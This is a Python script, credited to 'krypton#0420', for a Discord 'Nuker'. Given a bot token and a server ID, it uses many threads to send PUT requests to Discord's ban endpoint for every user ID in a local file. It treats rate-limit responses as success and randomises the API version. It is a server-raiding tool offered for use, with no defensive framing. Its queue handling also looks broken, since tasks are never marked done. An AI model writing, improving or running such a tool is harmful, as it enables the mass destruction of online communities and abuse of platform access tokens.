"""
Made by krypton#0420
"""
import os, httpx, threading, random, time
from queue import Queue

class Nuker:

    def __init__(self):

        print("-> Token; ", end="")
        self.Token = str(input()).strip()

        print("-> Guild ID; ", end="")
        self.Guild = int(input())

        print("-> Threads; ", end="")
        self.Threads = int(input())

        self.Clear = lambda: os.system("cls; clear")

        self.Clear()

        self.Lock = threading.Lock()

        self.Queue = Queue(self.Threads * 5)
        
        self.Request_Headers = {"Authorization": "Bot {}".format(self.Token)}

        self.Api = random.randint(6, 9)

        self.Users = []

    
    def Send_Request(self):
        try:
            while True:
                URLRequest = self.Queue.get()
                response = httpx.put(
                    URLRequest,
                    headers = self.Request_Headers,
                )
                if response.status_code in [200, 201, 204, 429]:
                    pass
                else:
                    json = response.json()
                    self.Lock.acquire()
                    print("-> Error; {}".format(json["message"]))
                    self.Lock.release()             
        except (Exception):
            return self.Send_Request()


    def StartWorkers(self):

        print("-> Starting all workers.")
        
        for user in open("data/users.txt").read().splitlines():
            self.Users.append(user)
        
        for _ in range(self.Threads):
            threading.Thread(target=self.Send_Request, daemon=True).start()

        for user in self.Users:
            self.Queue.put(
                "https://discord.com/api/v{}/guilds/{}/bans/{}".format(self.Api, self.Guild, user)
            )
        self.Queue.join()

        print("-> Workers finished."); time.sleep(3); os._exit(0)


if __name__ == "__main__":  Nuker().StartWorkers()

